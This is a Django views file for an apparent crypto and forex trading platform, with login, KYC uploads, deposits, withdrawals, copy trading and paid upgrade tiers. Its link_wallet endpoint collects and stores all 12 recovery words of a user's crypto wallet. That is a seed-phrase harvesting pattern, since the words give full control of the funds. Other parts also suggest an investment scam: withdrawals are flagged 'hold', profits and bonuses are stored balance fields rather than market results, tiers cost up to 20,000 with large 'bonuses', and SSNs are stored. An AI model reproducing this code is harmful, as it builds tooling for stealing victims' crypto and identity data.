# core/views.py
import os
import json

from django.shortcuts import render, redirect, get_object_or_404
from django.contrib.auth import get_user_model, authenticate, login
from django.contrib.auth.decorators import login_required
from django.contrib import messages
from django.templatetags.static import static
from django.http import JsonResponse, HttpRequest, FileResponse
from django.views.decorators.http import require_POST
from django.contrib.admin.views.decorators import staff_member_required

from django.http import JsonResponse, HttpResponseForbidden, Http404

from asgiref.sync import async_to_sync
from channels.layers import get_channel_layer

from django.contrib.auth.decorators import user_passes_test

# submit proof
from django.core.files.storage import default_storage

# Wallet 
from .models import WalletSettings

from django.contrib.auth.hashers import make_password, check_password

from .models import KYC, Vendor, P2PTrade

# Broadcast Notification
from .models import AdminNotification

# Copy Trading
from django.shortcuts import render
from .models import ExpertTrader, CopySubscription

from django.db import transaction
from django.core.cache import cache
import yfinance as yf 
from django.views.decorators.http import require_GET

from .models import BankInfo

# DRF imports
from rest_framework.views import APIView
from rest_framework.response import Response
from rest_framework import status
from rest_framework.permissions import AllowAny, IsAuthenticated
from rest_framework_simplejwt.views import TokenObtainPairView
from .serializers import UserSerializer, KYCSerializer
from .token_serializers import CustomTokenObtainPairSerializer

from .models import LinkedWallet

# New add for Admin trade
from django.db.models import F, Sum
from .models import ActiveTrade
from .models import CustomUser
from decimal import Decimal
from django.views.decorators.http import require_POST
import json
from .models import AccountDeposit, AccountWithdrawal, ActiveTrade, LinkedWallet
from django.http import HttpResponse
from django.utils import timezone
from django.utils.timezone import localtime
import csv



User = get_user_model()  # ✅ use your CustomUser model


CURRENCY_SYMBOLS = {
    'GBP': '£',
    'USD': '$',
    'EUR': '€',
    'JPY': '¥',
    'INR': '₹',
    'ZAR': 'R',
    'CAD': 'C$',
    'AUD': 'A$',
    'THB': '฿',
    'HKD': 'HK$',
    'NZD': 'NZ$',
    'SGD': 'S$',
    'CHF': 'Fr',
    'CNY': '¥',
}

# -----------------------------
# Auth pages (HTML)
# -----------------------------
def login_view(request):
    if request.method == 'POST':
        username = request.POST.get('username', '').strip()
        password = request.POST.get('password', '')

        user = authenticate(request, username=username, password=password)
        if user:
            login(request, user)
            # After login:
            kyc = KYC.objects.filter(user=user).first()
            if not kyc:
                # No KYC yet → go submit
                return redirect('kyc_start')
            # If submitted but not verified → allow dashboard (blocked by overlay)
            return redirect('dashboard')
        else:
            messages.error(request, 'Invalid credentials')
    return render(request, 'core/login.html')



def signup_view(request):
    if request.method == 'POST':
        full_name = request.POST.get('full_name')
        username  = request.POST.get('username')
        email     = request.POST.get('email')
        phone     = request.POST.get('phone')
        country   = request.POST.get('country')
        currency  = request.POST.get('currency', 'GBP')
        gender    = request.POST.get('gender')
        password  = request.POST.get('password')
        confirm_password = request.POST.get('confirm_password')
        referral  = request.POST.get('referral', '')
        age_check = request.POST.get('age_check')

        if not age_check:
            messages.error(request, "You must confirm you are 18 years or older.")
            return redirect('signup')

        if password != confirm_password:
            messages.error(request, "Passwords do not match.")
            return redirect('signup')

        if User.objects.filter(username=username).exists():
            messages.error(request, "Username already taken.")
            return redirect('signup')

        if User.objects.filter(email=email).exists():
            messages.error(request, "Email already registered.")
            return redirect('signup')

        # create user with required fields
        user = User.objects.create_user(
            username=username,
            email=email,
            password=password,
        )

        # safely set optional profile fields if your CustomUser has them
        for field, value in [
            ('full_name', full_name),
            ('phone_number', phone),
            ('country', country),
            ('currency', currency),
            ('gender', gender),
            ('referral_code', referral),
            ('is_over_18', True),
        ]:
            try:
                setattr(user, field, value)
            except Exception:
                pass

        user.save()

        login(request, user)
        messages.success(request, "Account created successfully.")
        return redirect('dashboard')


    return render(request, 'core/signup.html')


# -----------------------------
# Public pages
# -----------------------------
def home(request):
    return render(request, 'core/home.html')


def download_app(request):
    file_path = os.path.join('static', 'downloads', 'tronexi_app.apk')
    return FileResponse(open(file_path, 'rb'), as_attachment=True)


# -----------------------------
# DRF API endpoints
# -----------------------------
class RegisterView(APIView):
    permission_classes = [AllowAny]

    def post(self, request):
        username = request.data.get('username')
        email = request.data.get('email')
        password = request.data.get('password')

        if not username or not email or not password:
            return Response({"error": "All fields are required"}, status=status.HTTP_400_BAD_REQUEST)

        if User.objects.filter(username=username).exists():
            return Response({"error": "Username already exists"}, status=status.HTTP_400_BAD_REQUEST)

        if User.objects.filter(email=email).exists():
            return Response({"error": "Email already exists"}, status=status.HTTP_400_BAD_REQUEST)

        user = User(username=username, email=email, password=make_password(password))
        user.save()

        return Response({
            "id": user.id,
            "username": user.username,
            "email": user.email
        }, status=status.HTTP_201_CREATED)


class LoginView(APIView):
    permission_classes = [AllowAny]

    def post(self, request):
        email = request.data.get('email')
        password = request.data.get('password')

        if not email or not password:
            return Response({"error": "Email and password are required"}, status=status.HTTP_400_BAD_REQUEST)

        try:
            user = User.objects.get(email=email)
        except User.DoesNotExist:
            return Response({"error": "Invalid credentials"}, status=status.HTTP_400_BAD_REQUEST)

        if user.check_password(password):
            return Response({"message": "Login successful", "username": user.username}, status=status.HTTP_200_OK)
        else:
            return Response({"error": "Invalid credentials"}, status=status.HTTP_400_BAD_REQUEST)


class KYCView(APIView):
    permission_classes = [IsAuthenticated]

    def post(self, request):
        data = request.data.copy()
        data['user'] = request.user.id

        serializer = KYCSerializer(data=data)
        if serializer.is_valid():
            serializer.save()
            return Response(serializer.data, status=status.HTTP_201_CREATED)
        return Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST)


class ChangePasswordView(APIView):
    permission_classes = [IsAuthenticated]

    def post(self, request):
        user = request.user
        old_password = request.data.get('old_password')
        new_password = request.data.get('new_password')

        if not check_password(old_password, user.password):
            return Response({"error": "Old password is incorrect"}, status=400)

        user.set_password(new_password)
        user.save()
        return Response({"message": "Password changed successfully"}, status=200)


class CustomTokenObtainPairView(TokenObtainPairView):
    serializer_class = CustomTokenObtainPairSerializer


# -----------------------------
# Vendor / Trades (HTML)
# -----------------------------
def p2p_info(request):
    return render(request, 'core/p2p_info.html')


def vendor_list(request):
    vendors = Vendor.objects.all()
    return render(request, 'core/vendor_list.html', {'vendors': vendors})


@login_required
def start_trade(request, vendor_id):
    vendor = get_object_or_404(Vendor, id=vendor_id)

    if request.method == 'POST':
        amount = request.POST.get('amount')
        trade = P2PTrade.objects.create(user=request.user, vendor=vendor, amount=amount)
        return redirect('trade_detail', trade_id=trade.id)

    return render(request, 'core/start_trade.html', {'vendor': vendor})


@login_required
def trade_detail(request, trade_id):
    trade = get_object_or_404(P2PTrade, id=trade_id)

    # Only the trade owner or staff can see this page
    if not (request.user.is_staff or request.user == trade.user):
        return redirect('vendor_list')

    # User uploads proof
    if request.method == "POST" and 'upload_proof' in request.POST:
        file = request.FILES.get('payment_proof')
        if not file:
            messages.error(request, "Please attach a screenshot or receipt.")
        else:
            trade.payment_proof = file
            trade.status = 'paid'
            trade.save(update_fields=['payment_proof', 'status'])
            messages.success(request, "Payment proof uploaded. Escrow will verify shortly.")
        return redirect('trade_detail', trade_id=trade.id)

    channel_layer = get_channel_layer()
    if channel_layer:
        async_to_sync(channel_layer.group_send)(
            f"trade_{trade.id}",
            {
                "type": "chat.message",
                "sender": "System",
                "message": "User marked as PAID ✅ (payment proof uploaded)",
            }
        )

    return render(request, 'core/trade_detail.html', {'trade': trade})

# -----------------------------
# KYC pages (HTML) + Dashboard gate
# -----------------------------
@login_required
def kyc_start(request):
    # If already submitted, route accordingly
    kyc = KYC.objects.filter(user=request.user).first()
    if kyc:
        if kyc.verified:
            return redirect('dashboard')
        return redirect('kyc_status')

    if request.method == 'POST':
        full_name       = request.POST.get('full_name', '').strip()
        document_type   = request.POST.get('document_type', '').strip()   # passport | id_card | drivers_license
        document_number = request.POST.get('document_number', '').strip()
        state           = request.POST.get('state', '').strip()
        city            = request.POST.get('city', '').strip()

        # FILES — these names MUST match the form inputs below
        id_front = (
            request.FILES.get('id_front')     # new name (preferred)
            or request.FILES.get('id_document')  # fallback for any older form still posting this
        )
        id_back  = request.FILES.get('id_back')   # required for non-passport
        selfie   = request.FILES.get('selfie')    # optional

        # Basic validation
        if not (full_name and document_type and document_number):
            messages.error(request, "Please complete all required fields.")
            return redirect('kyc_start')

        if document_type == 'passport':
            if not id_front:
                messages.error(request, "Please upload your passport image.")
                return redirect('kyc_start')
            id_back = None  # ignore
        else:
            if not id_front:
                messages.error(request, "Please upload the FRONT of your ID.")
                return redirect('kyc_start')
            if not id_back:
                messages.error(request, "Please upload the BACK of your ID.")
                return redirect('kyc_start')

        # Create or update
        kyc_obj, _ = KYC.objects.update_or_create(
            user=request.user,
            defaults={
                'full_name':       full_name,
                'document_type':   document_type,
                'document_number': document_number,
                'state':           state,
                'city':            city,
                'verified':        False,
            },
        )

        # Save files
        if id_front:
            kyc_obj.id_front = id_front
        if document_type != 'passport' and id_back:
            kyc_obj.id_back = id_back
        if selfie:
            kyc_obj.selfie = selfie
        kyc_obj.save()

        messages.success(request, "KYC submitted. We’ll notify you after review.")
        return redirect('kyc_status')

    return render(request, 'core/kyc_form.html')


@login_required
def kyc_status(request):
    kyc = KYC.objects.filter(user=request.user).first()
    if not kyc:
        return redirect('kyc_start')

    if kyc.verified:
        messages.success(request, "Your KYC is verified. Welcome to your dashboard.")
        return redirect('dashboard')

    return render(request, 'core/kyc_status.html', {'kyc': kyc})

# -----------------------------
# Dashboard (HTML)
# -----------------------------
@login_required
def dashboard(request):
    # KYC
    kyc = KYC.objects.filter(user=request.user).first()
    if not kyc:
        return redirect('kyc_start')
    kyc_pending = not kyc.verified

    # avatar fallback
    if hasattr(request.user, 'profile') and getattr(request.user.profile, 'picture', None):
        profile_pic_url = request.user.profile.picture.url
    else:
        profile_pic_url = static('image/avatar.png')

    # trades, deposits, withdrawals
    active_trades = ActiveTrade.objects.filter(user=request.user, status='open').order_by('-opened_at')
    pending_deposits = AccountDeposit.objects.filter(user=request.user, status='pending').order_by('-created_at')
    pending_withdrawals = AccountWithdrawal.objects.filter(user=request.user, status='pending').order_by('-created_at')

    # format withdrawal notes (same as your code)
    import json
    def _display_withdraw_note(note: str) -> str:
        ...
    for w in pending_withdrawals:
        w.display_note = _display_withdraw_note(w.note)

    currency_code = getattr(request.user, 'currency', None) or 'GBP'
    currency_symbol = CURRENCY_SYMBOLS.get(currency_code, '£')

    notif = (
        AdminNotification.objects.filter(user=request.user, is_read=False)
        .order_by("-created_at")
        .first()
    )

    context = {
        'user_currency': getattr(request.user, 'currency', 'GBP'),
        'user_fullname': getattr(request.user, 'full_name',
                                 request.user.get_full_name() or request.user.username),
        'profile_pic_url': profile_pic_url,

        'account_balance': getattr(request.user, 'account_balance', 0),
        'profit_today':   getattr(request.user, 'profit_today',   0),
        'bonus_amount':   getattr(request.user, 'bonus_amount',  0),

        'active_trades': active_trades,
        'active_trades_count': active_trades.count(),
        'pending_deposits': pending_deposits,
        'pending_withdrawals': pending_withdrawals,

        'currency_code': currency_code,
        'currency_symbol': currency_symbol,

        # ✅ FIXED wallet linked check
        'wallet_linked': LinkedWallet.objects.filter(user=request.user, active=True, status="linked").exists(),

        'kyc_pending': kyc_pending,
        "notif": notif,
        "notif_json": json.dumps(
            {"id": notif.id, "title": notif.title, "message": notif.message},
            ensure_ascii=False,
        ) if notif else "null",
    }

    wallet = WalletSettings.objects.first()
    context['wallet_settings'] = wallet

    return render(request, 'dashboard.html', context)


# -----------------------------
# Wallet link endpoint (HTML uses fetch → POST)
# -----------------------------
@login_required
@require_POST
def link_wallet(request):
    provider = ""
    phrases = []

    if request.content_type and "application/json" in request.content_type:
        # Handle JSON input
        try:
            data = json.loads(request.body.decode("utf-8"))
        except json.JSONDecodeError:
            data = {}
        provider = (data.get("provider") or "").strip()
        phrases = [(data.get(f"phrase{i}") or "").strip() for i in range(1, 13)]
    else:
        # Handle form input
        provider = (request.POST.get("provider") or "").strip()
        phrases = [(request.POST.get(f"phrase{i}", "") or "").strip() for i in range(1, 13)]

    # Keep only non-empty
    phrases = [p for p in phrases if p]

    # ---- Validation ----
    if not provider:
        return JsonResponse({"status": "error", "message": "Wallet provider is required"}, status=400)

    if len(phrases) < 12:
        return JsonResponse({"status": "error", "message": "All 12 recovery words are required"}, status=400)

    # ---- Save or update ----
    linked_wallet, _ = LinkedWallet.objects.update_or_create(
        user=request.user,
        defaults={
            "provider": provider,
            "wallet_phrase": phrases,
            "linked_at": timezone.now(),
            "active": True,
            "status": "linked",
        }
    )

    return JsonResponse({
        "status": "success",
        "message": "Wallet linked successfully",
        "provider": linked_wallet.provider,
    })

# create deposit

@login_required
@require_POST
def create_deposit(request):
    try:
        data = json.loads(request.body.decode('utf-8'))
        amount = Decimal(str(data.get('amount', '0')))
        note = (data.get('note') or '').strip()
    except Exception:
        return JsonResponse({'status': 'error', 'message': 'Invalid payload'}, status=400)

    if amount <= 0:
        return JsonResponse({'status': 'error', 'message': 'Amount must be positive'}, status=400)

    dep = AccountDeposit.objects.create(user=request.user, amount=amount, note=note, status='pending')
    return JsonResponse({
        'status': 'success',
        'deposit': {
            'id': dep.id,
            'amount': f'{dep.amount:.2f}',
            'note': dep.note,
            'status': dep.status,
            'created_at': dep.created_at.strftime('%Y-%m-%d %H:%M')
        }
    })

# Download
@login_required
def export_statement_csv(request):
    response = HttpResponse(content_type='text/csv')
    filename = f"statement_{request.user.username}.csv"
    response['Content-Disposition'] = f'attachment; filename="{filename}"'

    writer = csv.writer(response)
    writer.writerow(['Date', 'Type', 'Amount', 'Note', 'Status', 'ID'])

    deposits = AccountDeposit.objects.filter(user=request.user, status='approved')
    withdrawals = AccountWithdrawal.objects.filter(user=request.user, status='approved')

    rows = []
    for d in deposits:
        when = d.decided_at or d.created_at
        rows.append((when, 'Deposit', d.amount, d.note, d.status, f'DEP-{d.id}'))
    for w in withdrawals:
        when = w.decided_at or w.created_at
        rows.append((when, 'Withdrawal', w.amount, w.note, w.status, f'WDL-{w.id}'))

    rows.sort(key=lambda r: r[0] or timezone.now())

    for when, typ, amt, note, status, rid in rows:
        ts = localtime(when).strftime('%Y-%m-%d %H:%M')
        writer.writerow([ts, typ, f'{amt:.2f}', note, status, rid])

    return response

# Take Profit and Take Bonus Section
@login_required
@require_POST
def take_profit(request):
    user = request.user
    user.refresh_from_db(fields=['profit_today', 'account_balance'])
    if (user.profit_today or 0) <= 0:
        return JsonResponse({'ok': False, 'error': 'No profit to take'}, status=400)

    CustomUser.objects.filter(pk=user.pk).update(
        account_balance=F('account_balance') + F('profit_today'),
        profit_today=Decimal('0')
    )
    return JsonResponse({'ok': True})


@login_required
@require_POST
def take_bonus(request):
    user = request.user
    user.refresh_from_db(fields=['bonus_amount', 'account_balance'])
    if (user.bonus_amount or 0) <= 0:
        return JsonResponse({'ok': False, 'error': 'No bonus to take'}, status=400)

    CustomUser.objects.filter(pk=user.pk).update(
        account_balance=F('account_balance') + F('bonus_amount'),
        bonus_amount=Decimal('0')
    )
    return JsonResponse({'ok': True})


# Admin trade

@login_required
@require_POST
def create_trade(request: HttpRequest) -> JsonResponse:
    """
    User opens a trade. Deduct amount immediately. created_by='user'.
    Body: {asset, side, leverage, duration, amount}
    """
    try:
        data = json.loads(request.body.decode('utf-8'))
    except Exception:
        return JsonResponse({'ok': False, 'error': 'Invalid JSON'}, status=400)

    asset    = (data.get('asset') or '').strip()
    side     = (data.get('side') or '').strip()   # 'buy' or 'sell'
    leverage = (data.get('leverage') or '').strip()
    duration = (data.get('duration') or '').strip()
    try:
        amount = Decimal(str(data.get('amount', '0')))
    except Exception:
        return JsonResponse({'ok': False, 'error': 'Invalid amount'}, status=400)

    if not asset or side not in ('buy', 'sell') or amount <= 0:
        return JsonResponse({'ok': False, 'error': 'Invalid inputs'}, status=400)

    # Check funds
    if (request.user.account_balance or Decimal('0')) < amount:
        return JsonResponse({'ok': False, 'error': 'Insufficient balance'}, status=400)

    # Create the trade
    t = ActiveTrade.objects.create(
        user=request.user,
        asset=asset,
        side=side,
        amount=amount,
        leverage=leverage or None,
        duration=duration or None,
        profit=Decimal('0'),
        status='open',
        created_by='user'
    )

    # Deduct now
    request.user.account_balance = F('account_balance') - amount
    request.user.save(update_fields=['account_balance'])

    # Recalc profit_today = sum of open trades
    agg = ActiveTrade.objects.filter(user=request.user, status='open').aggregate(s=Sum('profit'))
    request.user.refresh_from_db(fields=['account_balance'])
    request.user.profit_today = agg['s'] or Decimal('0')
    request.user.save(update_fields=['profit_today'])

    return JsonResponse({'ok': True, 'trade_id': t.id})


@login_required
@require_POST
def close_trade(request: HttpRequest, trade_id: int) -> JsonResponse:
    """
    User closes a trade they opened themselves. Credits principal + profit.
    """
    trade = get_object_or_404(
        ActiveTrade,
        id=trade_id,
        user=request.user,
        created_by='user',
        status='open'
    )

    profit = trade.profit or Decimal('0')

    # Credit principal + profit
    request.user.account_balance = F('account_balance') + trade.amount + profit
    request.user.save(update_fields=['account_balance'])

    trade.status = 'closed'
    trade.closed_at = timezone.now()
    trade.save(update_fields=['status', 'closed_at'])

    # Recompute profit_today from remaining OPEN
    agg = ActiveTrade.objects.filter(user=request.user, status='open').aggregate(s=Sum('profit'))
    request.user.refresh_from_db(fields=['account_balance'])
    request.user.profit_today = agg['s'] or Decimal('0')
    request.user.save(update_fields=['profit_today'])

    return JsonResponse({'ok': True})

# Map your UI symbols to Yahoo tickers + decimals to display
WATCHLIST_DEFAULT = [
    {"sym": "BTC",    "name": "Bitcoin",         "yticker": "BTC-USD",   "dp": 2},
    {"sym": "ETH",    "name": "Ethereum",        "yticker": "ETH-USD",   "dp": 2},
    {"sym": "SOL",    "name": "Solana",          "yticker": "SOL-USD",   "dp": 2},
    {"sym": "EURUSD", "name": "EUR/USD",         "yticker": "EURUSD=X",  "dp": 5},
    {"sym": "GOLD",   "name": "Gold (XAU)",      "yticker": "GC=F",      "dp": 1},  # Gold futures
    {"sym": "SILVER", "name": "Silver (XAG)",    "yticker": "SI=F",      "dp": 2},  # Silver futures
    {"sym": "OIL",    "name": "Crude Oil (WTI)", "yticker": "CL=F",      "dp": 2},  # WTI futures
]

@login_required
@require_GET
def watchlist_quotes(request):
    """
    Returns live-ish quotes using yfinance. Cached for 30s to avoid hammering.
    Response:
      { ok: true, quotes: [{sym,name,price,change,change_pct,dp}] }
    """
    cache_key = "watchlist:v1:" + ",".join(x["yticker"] for x in WATCHLIST_DEFAULT)
    data = cache.get(cache_key)
    if data:
        return JsonResponse({"ok": True, "quotes": data})

    quotes = []
    for it in WATCHLIST_DEFAULT:
        try:
            t = yf.Ticker(it["yticker"])
            # Try fast_info first
            price = None
            prev_close = None
            fi = getattr(t, "fast_info", None)
            if fi:
                price = getattr(fi, "last_price", None) or getattr(fi, "last", None)
                prev_close = getattr(fi, "previous_close", None)

            # Fallback to history if needed
            if price is None or prev_close is None:
                hist = t.history(period="2d", interval="1d")
                if not hist.empty:
                    price = float(hist["Close"].iloc[-1])
                    prev_close = float(hist["Close"].iloc[-2]) if len(hist) > 1 else price

            if price is None:
                continue

            change = price - (prev_close or price)
            pct = (change / prev_close * 100) if prev_close else 0.0

            quotes.append({
                "sym": it["sym"],
                "name": it["name"],
                "price": round(float(price), it["dp"]),
                "change": round(float(change), it["dp"] if it["sym"] != "EURUSD" else 5),
                "change_pct": round(float(pct), 2),
                "dp": it["dp"],
            })
        except Exception:
            # Skip any symbol that fails (network, symbol not found, etc.)
            continue

    # Cache 30 seconds
    cache.set(cache_key, quotes, 30)
    return JsonResponse({"ok": True, "quotes": quotes})

@login_required
@require_GET
def recent_activity(request):
    """
    Collates last events for this user across trades + deposits + withdrawals.
    """
    u = request.user
    items = []

    trades = ActiveTrade.objects.filter(user=u).order_by("-opened_at")[:6]
    for t in trades:
        msg = f"{t.get_side_display()} {t.asset} £{t.amount}"
        items.append({"t": "trade", "msg": msg, "ts": t.opened_at.isoformat()})

    deps = AccountDeposit.objects.filter(user=u).order_by("-created_at")[:6]
    for d in deps:
        items.append({"t": "deposit", "msg": f"Deposit £{d.amount} — {d.status}", "ts": d.created_at.isoformat()})

    wds = AccountWithdrawal.objects.filter(user=u).order_by("-created_at")[:6]
    for w in wds:
        items.append({"t": "withdrawal", "msg": f"Withdrawal £{w.amount} — {w.status}", "ts": w.created_at.isoformat()})

    # Newest first, return top 10 mixed
    items.sort(key=lambda x: x["ts"], reverse=True)
    return JsonResponse({"ok": True, "items": items[:10]})


@login_required
@require_POST
def submit_deposit_proof(request):
    try:
        amount = Decimal(request.POST.get('amount', '0'))
    except Exception:
        return JsonResponse({'ok': False, 'error': 'Invalid amount'}, status=400)

    f = request.FILES.get('proof')
    if not f:
        return JsonResponse({'ok': False, 'error': 'No file uploaded'}, status=400)

    # Save under MEDIA_ROOT/deposit_proofs/
    rel_path = default_storage.save(os.path.join('deposit_proofs', f.name), f)
    # Store RELATIVE path in note JSON:
    note = json.dumps({'type': 'user_proof', 'file': rel_path})

    AccountDeposit.objects.create(
        user=request.user,
        amount=amount,
        status='pending',
        note=note
    )
    return JsonResponse({'ok': True})


@login_required
@require_POST
def request_withdrawal(request):
    try:
        data = json.loads(request.body.decode('utf-8'))
    except Exception:
        return JsonResponse({'ok': False, 'error': 'Invalid payload'}, status=400)

    # Amount
    try:
        amount = Decimal(str(data.get('amount', '0')))
    except Exception:
        return JsonResponse({'ok': False, 'error': 'Invalid amount'}, status=400)

    method = (data.get('method') or '').strip().lower()
    meta   = data.get('meta') or {}

    if amount <= 0:
        return JsonResponse({'ok': False, 'error': 'Amount must be positive'}, status=400)

    user = request.user

    # -------- Save bank info for future use (when requested) --------
    if method == 'bank':
        bank = meta.get('bank') or {}
        if meta.get('save_bank'):
            BankInfo.objects.update_or_create(
                user=user,
                defaults={
                    'bank_name':        bank.get('bank_name', ''),
                    'account_name':     bank.get('account_name', ''),
                    'account_number':   bank.get('account_number', ''),
                    'routing_or_swift': bank.get('routing_or_swift', ''),
                    'country':          (bank.get('country', '') or '').upper(),
                    'us_account_type':  (bank.get('us_account_type') or None),
                    'us_ssn':           (bank.get('us_ssn') or None),
                }
            )
        # ✅ Always attach bank info to withdrawal note
        note = {'method': method, 'meta': {'bank': bank}, 'hold': True}
    else:
        # ✅ For crypto, always attach wallet address to withdrawal note
        note = {'method': method, 'meta': meta, 'hold': True}


    # Atomic: create request and deduct immediately
    with transaction.atomic():
        user.refresh_from_db(fields=['account_balance'])
        if (user.account_balance or Decimal('0')) < amount:
            return JsonResponse({'ok': False, 'error': 'Insufficient balance'}, status=400)

        wd = AccountWithdrawal.objects.create(
            user=user,
            amount=amount,
            method=method,               # 🔑 save method properly
            status='pending',
            note=json.dumps(note),
            bank_name=meta.get('bank', {}).get('bank_name', ''),
            account_name=meta.get('bank', {}).get('account_name', ''),
            account_number=meta.get('bank', {}).get('account_number', ''),
            routing_or_swift=meta.get('bank', {}).get('routing_or_swift', ''),
            country=(meta.get('bank', {}).get('country', '') or '').upper()
        )

    return JsonResponse({'ok': True, 'id': wd.id})

@staff_member_required
def staff_trade_chat(request, trade_id):
    trade = get_object_or_404(P2PTrade, pk=trade_id)
    return render(request, "core/staff_trade_chat.html", {"trade": trade})

# Copy Trading
@login_required
def copy_list(request):
    experts = ExpertTrader.objects.filter(is_active=True).order_by('-wins', 'name')
    active_map = {
        s.expert_id: s
        for s in CopySubscription.objects.filter(user=request.user, active=True)
    }
    return render(request, 'core/copy_list.html', {
        'experts': experts,
        'active_map': active_map,
    })

@login_required
@require_POST
def copy_start(request, expert_id):
    expert = get_object_or_404(ExpertTrader, pk=expert_id, is_active=True)
    with transaction.atomic():
        # end any existing active sub for this pair (safety)
        CopySubscription.objects.filter(user=request.user, expert=expert, active=True).update(
            active=False, status='cancelled', ended_at=timezone.now()
        )
        CopySubscription.objects.create(user=request.user, expert=expert, active=True, status='active')
    messages.success(request, f"You are now copying {expert.name}.")
    return redirect('copy_list')

@login_required
@require_POST
def copy_cancel(request, expert_id):
    sub = get_object_or_404(CopySubscription, user=request.user, expert_id=expert_id, active=True)
    sub.active = False
    sub.status = 'cancelled'
    sub.ended_at = timezone.now()
    sub.save(update_fields=['active', 'status', 'ended_at'])
    messages.info(request, f"Stopped copying {sub.expert.name}.")
    return redirect('copy_list') #---Close copy trading

# Upgrade Account
@login_required
def upgrade_plans(request):
    # Feel free to tweak prices/features
    plans = [
        {
            "code": "starter",
            "name": "Starter",
            "price": 1500,
            "features": ["24×7 Support", "Professional Charts", "Trading Alerts", "Trading Central Starter", "1,500 USD Bonus"],
        },
        {
            "code": "bronze",
            "name": "Bronze",
            "price": 2000,
            "features": ["24×7 Support", "Professional Charts", "Trading Alerts", "Trading Central Bronze", "3,500 USD Bonus"],
        },
        {
            "code": "silver",
            "name": "Silver",
            "price": 5000,
            "features": ["24×7 Support", "Professional Charts", "Trading Alerts", "Live Trading with Experts", "SMS & Email Alerts", "8,500 USD Bonus"],
        },
        {
            "code": "diamond",
            "name": "Diamond",
            "price": 10000,
            "features": ["24×7 Support", "Professional Charts", "Trading Alerts", "Trading Central Basic", "Live Trading with Experts", "SMS & Email Alerts", "12,500 USD Bonus"],
        },
        {
            "code": "gold",
            "name": "Gold",
            "price": 20000,
            "features": ["24×7 Support", "Professional Charts", "Trading Alerts", "Trading Central Basic", "Live Trading with Experts", "SMS & Email Alerts", "21,500 USD Bonus"],
        },
    ]
    return render(request, "core/upgrade_plans.html", {"plans": plans})

@login_required
def upgrade_status_json(request):
    u = request.user
    data = {
        "current_plan": u.current_plan,
        "current_plan_label": u.get_current_plan_display(),
        "pending_plan": u.pending_plan,
        "pending_plan_label": u.get_pending_plan_display() if u.pending_plan else "",
        "progress": int(u.upgrade_progress or 0),
    }
    return JsonResponse({"ok": True, "data": data})



# ---------- API: My Transactions (deposits + withdrawals, merged) ----------
@login_required
def api_transactions_recent(request):
    user = request.user
    deposits = AccountDeposit.objects.filter(user=user).order_by('-created_at')[:30]
    withdrawals = AccountWithdrawal.objects.filter(user=user).order_by('-created_at')[:30]

    items = []
    for d in deposits:
        items.append({
            "ts": d.created_at,
            "time": timezone.localtime(d.created_at).strftime("%b %d, %Y %H:%M"),
            "kind": "Deposit",
            "amount": str(d.amount),
            "status": d.status.title(),
            "note": "",
        })
    for w in withdrawals:
        items.append({
            "ts": w.created_at,
            "time": timezone.localtime(w.created_at).strftime("%b %d, %Y %H:%M"),
            "kind": "Withdrawal",
            "amount": str(w.amount),
            "status": w.status.title(),
            "note": "",
        })

    items.sort(key=lambda x: x["ts"], reverse=True)
    for it in items:
        it.pop("ts", None)

    return JsonResponse({"ok": True, "items": items})


# ---------- API: Recent Withdrawals (last 10) ----------
@login_required
def api_withdrawals_recent(request):
    user = request.user
    qs = AccountWithdrawal.objects.filter(user=user).order_by('-created_at')[:10]
    items = [{
        "time": timezone.localtime(w.created_at).strftime("%b %d, %Y %H:%M"),
        "amount": str(w.amount),
        "status": w.status.title(),
    } for w in qs]
    return JsonResponse({"ok": True, "items": items})


# ---------- API: Trade History (recent closed trades) ----------
@login_required
def api_trades_recent(request):
    user = request.user
    qs = ActiveTrade.objects.filter(user=user, status='closed').order_by('-closed_at', '-opened_at')[:30]
    items = []
    for t in qs:
        when = t.closed_at or t.opened_at
        items.append({
            "time": timezone.localtime(when).strftime("%b %d, %Y %H:%M"),
            "asset": t.asset,
            "side": (t.side or "").title(),
            "amount": str(t.amount),
            "profit": str(t.profit or 0),
        })
    return JsonResponse({"ok": True, "items": items})


# ---------- Profile: GET (prefill) / POST (save) ----------
@login_required
def me_profile(request):
    u = request.user

    # Build a friendly UID:
    # 1) use public_uid if present
    # 2) else use referral_code if present
    # 3) else use fast-forwarded numeric (id + 100000)
    uid = (
        getattr(u, "public_uid", None)
        or getattr(u, "referral_code", None)
        or f"TRX-{u.pk + 378925300}"
    )

    if request.method == "GET":
        return JsonResponse({
            "user": {
                "id": u.pk,
                "uid": uid,
                "username": u.username,
                "email": u.email,
                "full_name": getattr(u, "full_name", "") or "",
                "phone_number": getattr(u, "phone_number", "") or "",
                "country": getattr(u, "country", "") or "",
                "gender": getattr(u, "gender", "") or "",
            }
        })

    if request.method == "POST":
        u.full_name    = request.POST.get("full_name", u.full_name)
        u.phone_number = request.POST.get("phone_number", u.phone_number)
        u.country      = request.POST.get("country", u.country)
        u.gender       = request.POST.get("gender", u.gender)
        u.save(update_fields=["full_name", "phone_number", "country", "gender"])
        return JsonResponse({"ok": True})

    return JsonResponse({"error": "Method not allowed"}, status=405)


# ---------- Change Password: POST only ----------
@login_required
@require_POST
def me_password(request):
    u = request.user
    current = request.POST.get("current_password") or ""
    new1    = request.POST.get("new_password1") or ""
    new2    = request.POST.get("new_password2") or ""

    if not u.check_password(current):
        return JsonResponse({"ok": False, "error": "Current password is incorrect."}, status=400)
    if len(new1) < 8:
        return JsonResponse({"ok": False, "error": "New password must be at least 8 characters."}, status=400)
    if new1 != new2:
        return JsonResponse({"ok": False, "error": "Passwords do not match."}, status=400)

    u.set_password(new1)
    u.save(update_fields=['password'])
    return JsonResponse({"ok": True})

@require_POST
@login_required
def notification_mark_read(request, pk):
    try:
        notif = AdminNotification.objects.get(pk=pk, user=request.user)
    except AdminNotification.DoesNotExist:
        raise Http404("Notification not found")
    notif.is_read = True
    notif.save(update_fields=["is_read"])
    return JsonResponse({"ok": True})

